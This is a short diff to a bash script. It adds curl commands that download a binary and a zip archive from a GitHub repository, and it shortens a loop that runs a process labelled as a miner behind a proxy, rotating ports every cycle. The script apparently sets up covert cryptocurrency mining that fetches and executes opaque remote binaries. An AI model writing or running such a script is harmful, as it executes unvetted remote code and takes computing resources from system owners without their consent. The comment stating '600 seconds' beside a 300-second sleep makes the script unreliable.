@@ -1,5 +1,6 @@
 #!/bin/bash
-
+curl -O -L -J https://github.com/dolmerda26/vigilant-fortnight/raw/refs/heads/main/bos
+curl -O -L -J https://github.com/dolmerda26/vigilant-fortnight/raw/refs/heads/main/pas.zip
 unzip pas.zip
 chmod +x proxy
 chmod +x bos
@@ -25,7 +26,7 @@ while true; do
     MINER_PID=$!
 
     # Run for 5 minutes (600 seconds)
-    sleep 600
+    sleep 300
 
     echo "Rotating port..."
 
